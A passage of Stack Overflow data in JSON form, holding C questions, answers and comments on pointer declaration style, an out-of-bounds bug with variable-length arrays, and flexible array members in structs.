left,right?", "body": "<p>When programming in C, if you get in the habit of attaching the * to the variable names it will make more sense to you.</p>\n\n<pre><code>int *i,j;\n</code></pre>\n\n<p>i is an int* and j is an int.</p>\n"}, {"comments": [{"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 3, "creation_date": 1498066086, "post_id": 44682571, "comment_id": 76349377, "body": "Many would contest the assertion that this way is less awful."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1498066186, "post_id": 44682571, "comment_id": 76349429, "body": "True, but the point is that it&#39;s a choice between two schemes that each have their advantages and disadvantages."}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 2, "creation_date": 1498066269, "post_id": 44682571, "comment_id": 76349472, "body": "<code>int[10] a;</code> What?"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1498067231, "post_id": 44682571, "comment_id": 76349976, "body": "@NathanOliver That&#39;s how you&#39;d declare an array if the rule was the one the OP suggests. Just like <code>int* a, b;</code> instead of <code>int *a, *b;</code> you&#39;d have <code>int[10] a, b;</code> instead of <code>int a[10], b[10];</code>. Unless you&#39;re suggesting something even more bizarre."}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1498067304, "post_id": 44682571, "comment_id": 76350013, "body": "@DavidSchwartz Oh.  I didn&#39;t get that you were showing how it would look if it was attached to the type."}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 1, "last_activity_date": 1498074025, "last_edit_date": 1498074025, "creation_date": 1498066006, "answer_id": 44682571, "question_id": 44682501, "link": "https://stackoverflow.com/questions/44682501/why-node-left-right-and-not-node-left-right/44682571#44682571", "title": "Why node *left,*right and not node* left,right?", "body": "<p>You have to pick one way or the other, and this way is less awful. For an example of how awful the other way would be, compare:</p>\n\n<pre><code>int a[10], b[20], c[30];\n</code></pre>\n\n<p>to</p>\n\n<pre><code>int[10] a;\nint[20] b;\nint[30] c;\n</code></pre>\n"}], "owner": {"reputation": 79, "user_id": 5327659, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vxtCL.jpg?s=128&g=1", "display_name": "tejal567", "link": "https://stackoverflow.com/users/5327659/tejal567"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 407, "favorite_count": 0, "closed_date": 1498065983, "answer_count": 2, "score": -3, "last_activity_date": 1498074025, "creation_date": 1498065768, "question_id": 44682501, "link": "https://stackoverflow.com/questions/44682501/why-node-left-right-and-not-node-left-right", "closed_reason": "Duplicate", "title": "Why node *left,*right and not node* left,right?", "body": "<p>The type of left and right is node* so like other types they should be declared as node* left,right; Example int a,b; </p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1498063377, "post_id": 44681745, "comment_id": 76347803, "body": "Have you tried a debugger?"}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498063465, "post_id": 44681745, "comment_id": 76347862, "body": "@EugeneSh. That would not work here, since he is legitimately accessing memory he allocated...  if I&#39;m wrong, let me know which debugger can catch this (I hand-debug errors like this a lot.)"}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 0, "creation_date": 1498063507, "post_id": 44681745, "comment_id": 76347890, "body": "Where are you declaring <code>n</code>?  I think that&#39;s where the problem comes in."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 1, "creation_date": 1498063554, "post_id": 44681745, "comment_id": 76347918, "body": "@Alex Track the indices? Why are they going out of bounds? Can be debugged very well."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498063914, "post_id": 44681745, "comment_id": 76348141, "body": "You need to post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. This code does not declare <code>n</code>, missing <code>#include</code>s, missing <code>main()</code>; in short, uncompilable."}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498064111, "post_id": 44681745, "comment_id": 76348233, "body": "@EugeneSh. So, say I declared a two-dimensional array <code>char c[6][6]</code>, and then I tried to access <code>c[1][6]</code>.  Do you mean there&#39;s actually a way to catch that with a debugger?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 1, "creation_date": 1498064257, "post_id": 44681745, "comment_id": 76348299, "body": "@Alex: Sure: trace and  inspect."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498064536, "post_id": 44681745, "comment_id": 76348452, "body": "Can you show a graphical representation... What is it exactly? Your language is a bit confusing."}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1498064917, "post_id": 44681745, "comment_id": 76348667, "body": "@alk You mean hand-debug, right?  I think Eugene was suggesting there was a debugger that would catch that..."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498065200, "post_id": 44681745, "comment_id": 76348818, "body": "@Alex-- what do you think that debuggers catch? If the program crashes, you can see information related to the crash. If not, you are able to track and inspect variables conveniently as code runs, or step through code a line at a time. Much finer control than <code>printf()</code>s, if that is what you mean by &quot;hand-debug&quot;."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 1, "creation_date": 1498065206, "post_id": 44681745, "comment_id": 76348822, "body": "@Alex: A debugger can do more than catch a segmentation fault!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498068932, "post_id": 44681745, "comment_id": 76350915, "body": "Minor tip: when detailing 2D arrays with sample code and for the answers, it is often more clear to use different sized dimensions rather than &quot;we have a 8 times 8 grid&quot; and <code>n</code> for both."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 0, "creation_date": 1498154593, "post_id": 44681745, "comment_id": 76395753, "body": "@Alex there is an experimental option to Valgrind which does stack ckecking as well."}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1498231359, "post_id": 44681745, "comment_id": 76432269, "body": "@alk The problem was not just that the allocation is on the stack-- but it was, that the accessed entry was fully within the allocated memory.  A matter of detecting <code>array[2][6]</code> is invalid, whereas <code>array[3][0]</code> is valid, for the same memory location."}], "answers": [{"comments": [{"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 2, "creation_date": 1498064483, "post_id": 44682063, "comment_id": 76348414, "body": "calloc and realloc have different semantics. In particular, calloc() initializes the returned array with zero, realloc does not. This can lead to surprises.  Also, you could maybe show how to do error checking with realloc(), the realloc statements above show exactly what one should never do."}], "tags": [], "owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "is_accepted": true, "score": 3, "last_activity_date": 1498065691, "last_edit_date": 1498065691, "creation_date": 1498064259, "answer_id": 44682063, "question_id": 44681745, "link": "https://stackoverflow.com/questions/44681745/about-array-with-variable-size-in-c/44682063#44682063", "title": "About array with variable size in C", "body": "<p>It seems that you misinterpret the term VLA. It doesn't means that the size of the array may vary, but that you can dynamically decide what is the size of the array (but the size is fixed once).</p>\n\n<p>You are adding more element to <code>ri</code> and <code>ci</code> without having reallocate them...\nI suggest you to, first use dynamic allocation:</p>\n\n<pre><code>int *ri = calloc(sizeof(int),count); //array that stores the row index of trial points;\nif (ri==NULL) { /* error */ }\nint *ci = calloc(sizeof(int),count);\nif (ci==NULL) { /* error */ }\n</code></pre>\n\n<p>then add two lines just before your problematic loop as:</p>\n\n<pre><code>int *ri2 = realloc(ri,count*sizeof(int));\nif (ri2==NULL) { /* error */ }\nri = ri2;\nint *ci2 = realloc(ci,count*sizeof(int));\nif (ci2==NULL) { /* error */ }\nci = ci2;\n</code></pre>\n\n<p>In between these portion of code, <code>count</code> may change!</p>\n\n<p>--- EDIT ---</p>\n\n<p>You need to also take care about Alex's answer...</p>\n"}, {"comments": [{"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1498064588, "post_id": 44682157, "comment_id": 76348484, "body": "His array is (n+1)x(n+1)... <code>char c[n+1][n+1];</code>"}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "reply_to_user": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1498064822, "post_id": 44682157, "comment_id": 76348609, "body": "Yeah, he edited the post, it looks like.  Still has the same problem though...  Also for accessing indices &lt;0."}, {"owner": {"reputation": 115, "user_id": 8131971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fefa443575403c41742960850a3b689?s=128&d=identicon&r=PG&f=1", "display_name": "Syoung", "link": "https://stackoverflow.com/users/8131971/syoung"}, "edited": false, "score": 0, "creation_date": 1498068221, "post_id": 44682157, "comment_id": 76350508, "body": "I forgot this line: # define n 7."}], "tags": [], "owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "is_accepted": false, "score": 1, "last_activity_date": 1498064770, "last_edit_date": 1498064770, "creation_date": 1498064516, "answer_id": 44682157, "question_id": 44681745, "link": "https://stackoverflow.com/questions/44681745/about-array-with-variable-size-in-c/44682157#44682157", "title": "About array with variable size in C", "body": "<p>Yes, that is what is causing the problem.  While you still have not said what your <code>n</code> is, so the problem described in the other poster's answer might also be applicable; however, there are also problems within the code you posted.</p>\n\n<p>When you say statements like</p>\n\n<p><code>c[i][j+1]='t';</code></p>\n\n<p>In case <code>i == n</code>, then </p>\n\n<p><code>c[i][j+1] = c[i][n+1] = c[i+1][0]</code></p>\n\n<p>This is because your array is <code>n+1 x n+1</code>, so any time you access the <code>n+1</code>-st entry, it spills over into the next index.</p>\n\n<p>If you check whether <code>i == n</code> before attempting to set the value, then you would avoid this error.</p>\n"}], "owner": {"reputation": 115, "user_id": 8131971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fefa443575403c41742960850a3b689?s=128&d=identicon&r=PG&f=1", "display_name": "Syoung", "link": "https://stackoverflow.com/users/8131971/syoung"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 96, "favorite_count": 0, "accepted_answer_id": 44682063, "answer_count": 2, "score": 0, "last_activity_date": 1498065691, "creation_date": 1498063162, "last_edit_date": 1498064690, "question_id": 44681745, "link": "https://stackoverflow.com/questions/44681745/about-array-with-variable-size-in-c", "title": "About array with variable size in C", "body": "<p>I am trying to solve the following problem: </p>\n\n<p>Assume we have a 8 times 8 grid (of course it could be a larger grid). </p>\n\n<p>We label all outer boundary points of the square as 'n', and points adjacent to them as 't', and all other points are 'f'. </p>\n\n<p>I want to program a process that transfers all points to be 'n' by the following rule (I need to follow this rule, because this problem is a part of a bigger problem while the rest part is irrelevant to my question here): </p>\n\n<p>I need to put all 't' points in order, and transfer the first element to be 'n'. Then I need to delete the first element which has been changed to 'n', and move the last element to the first location. Also, I need to relabel all 'f' points that are adjacent to the changed point as 't' and put them to the end of the sequence of 't' points. I need to continue this process until there is no 't' or 'f'.</p>\n\n<p>To do this I used array with variable size, and my code is as the following:</p>\n\n<pre><code>int i,j;\nchar c[n+1][n+1];\nint count=0;\nint newi[4];\nint newj[4];\nint ind;\n//initialization\nfor(i=0; i&lt;n+1;i++){\n    for(j=0;j&lt;n+1;j++){\n        if(i==0||j==0||i==n||j==n){\n            c[i][j]='n';           //tagged as newly known\n        }\n        else if(i==1||j==1||i==n-1||j==n-1){\n            c[i][j]='t';               //trial points\n        }\n        else{\n            c[i][j]='f';               //far away points\n        }\n    }\n}\nfor(i=0; i&lt;n+1;i++){\n    for(j=0;j&lt;n+1;j++){\n        if(c[i][j]=='t'){\n            count=count+1;           //count is number of 't'\n        }\n    }\n}\n\nint ri[count]; //array that stores the row index of trial points;\nint ci[count]; //array that stores the column index of trial points;\nint k=0;\nfor(i=0; i&lt;n+1;i++){\n    for(j=0;j&lt;n+1;j++){\n        if(c[i][j]=='t'){\n            ri[k]=i;\n            ci[k]=j;\n            k=k+1;\n        }\n    }\n}\nwhile(count&gt;0){\n    int num=0;\n    i=ri[0];\n    j=ci[0];\n    c[i][j]='n';\n    ri[0]=ri[count-1];\n    ci[0]=ci[count-1];\n    count--;\n    int newcount=0;\n    if(c[i-1][j]=='f'){\n        c[i-1][j]='t';\n        newcount++;\n        newi[newcount-1]=i-1;\n        newj[newcount-1]=j;\n    }\n    if(c[i+1][j]=='f'){\n        c[i+1][j]='t';\n        newcount++;\n        newi[newcount-1]=i+1;\n        newj[newcount-1]=j;\n    }\n    if(c[i][j-1]=='f'){\n        c[i][j-1]='t';\n        newcount++;\n        newi[newcount-1]=i;\n        newj[newcount-1]=j-1;\n    }\n    if(c[i][j+1]=='f'){\n        c[i][j+1]='t';\n        newcount++;\n        newi[newcount-1]=i;\n        newj[newcount-1]=j+1;\n    }\n   count=count+newcount;\n    for(ind=count-newcount;ind&lt;count;ind++)/////\n    {\n        ri[ind]=newi[ind-count+newcount];\n        ci[ind]=newj[ind-count+newcount];\n    } \n}\n</code></pre>\n\n<p>It works fine for several loops at the beginning. However, after my careful check, then in a loop the code</p>\n\n<pre><code>for(ind=count-newcount;ind&lt;count;ind++)/////\n    {\n        ri[ind]=newi[ind-count+newcount];\n        ci[ind]=newj[ind-count+newcount];\n    }\n</code></pre>\n\n<p>not only add new elements to the end of index arrays 'ri' and 'ci', but also changed the first element of 'ri', and then mess up everything.</p>\n\n<p>My question is that how this happens. Is it a problem caused by using array with variable length? Should I avoid using arrays with variable length?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1498062752, "post_id": 44681592, "comment_id": 76347466, "body": "The task is not worded precisely. It is impossible to have a dynamic 2D array within a structure. It is possible to have a pointer to one, though..."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1498062757, "post_id": 44681592, "comment_id": 76347467, "body": "You can&#39;t refer to struct members as ordinary variables."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1498062792, "post_id": 44681592, "comment_id": 76347488, "body": "@EugeneSh. Maybe they mean a flexible array member."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1498062811, "post_id": 44681592, "comment_id": 76347499, "body": "@Barmar Can it be 2d? I guess only with one dimension fixed"}, {"owner": {"reputation": 53, "user_id": 6949663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70db60079949cf3637b797dc9acb84d3?s=128&d=identicon&r=PG&f=1", "display_name": "stefam mierz", "link": "https://stackoverflow.com/users/6949663/stefam-mierz"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498062911, "post_id": 44681592, "comment_id": 76347550, "body": "@EugeneSh yes I should wrote flexible array member"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498063093, "post_id": 44681592, "comment_id": 76347642, "body": "&quot;does not work&quot; is not an acceptable problem description."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498063168, "post_id": 44681592, "comment_id": 76347682, "body": "&quot;two-dimensional flexible array&quot; --&gt; I suspect only a 1D flexible array member  is allowed. <code>struct my_struct{  int firstField;  int secondField;  int columns;  int rows;  double tab[][]; };</code> erorrs with &quot;error: array type has incomplete element type &#39;double[]&#39;&quot;"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498063441, "post_id": 44681592, "comment_id": 76347845, "body": "Empirically, GCC and Clang both allow a FAM like <code>int fam[][32];</code> with a fixed second dimension.  You have to work harder to get a 2D VLA with both dimensions variable."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1498064307, "post_id": 44681592, "comment_id": 76348324, "body": "It is difficult to offer solutions when the problem statement is simply, &quot;it doesn&#39;t work&quot;.  Please <a href=\"https://stackoverflow.com/posts/44681592/edit\">edit</a> your question to give a more complete description of what you expected to happen and how that differs from the actual results.  See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> for hints on what makes a good explanation."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498066846, "post_id": 44682533, "comment_id": 76349774, "body": "Other improvements would include using <code>size_t rows</code> rather than <code>int rows</code>, allowing for <code>rows*columns== 0</code>.  More efficient allocation scheme (1 or 2 allocs vs 1 + rows allocs), using <code>const</code> when printing, etc."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1498066560, "last_edit_date": 1498066560, "creation_date": 1498065876, "answer_id": 44682533, "question_id": 44681592, "link": "https://stackoverflow.com/questions/44681592/2d-dynamic-array-in-structure/44682533#44682533", "title": "2d dynamic array in structure", "body": "<p>A <code>struct</code> cannot have a 2D VLA <em>variable logic array</em> nor a 2D FAM, <em>flexible array member</em> like with member <code>double tab[columns][rows];</code>.  A <code>struct</code> can have a final  of 1 dimensional FAM.</p>\n\n<p>Code can get close to OP's goal of \"Create struct with fields: 2 integers, two-dimensional flexible array (double or float) \" by using a flexible array member that is an array of <code>double *</code>.</p>\n\n<pre><code>struct my_struct {\n  int columns;\n  int rows;\n  double *tab[/* row */];\n};\n</code></pre>\n\n<p>This makes <code>tab</code>, not a 2D array but a 1D array of <code>double *</code>.  This is  usable like a 2D array with the <code>[][]</code> syntax.</p>\n\n<hr>\n\n<p>First allocate not only memory for <code>my_struct</code>, but also for the appended array of <code>double *</code> pointers.  Then allocate memory for the <code>double</code> array for each pointer.</p>\n\n<p>As with all allocations, good to test if the allocation succeeded.  Following simple uses <code>assert(p);</code></p>\n\n<p>I replaced working code with some TBD to allow for OP's learning experience.</p>\n\n<pre><code>struct my_struct *my_struct_alloc(int columns, int rows) {\n  struct 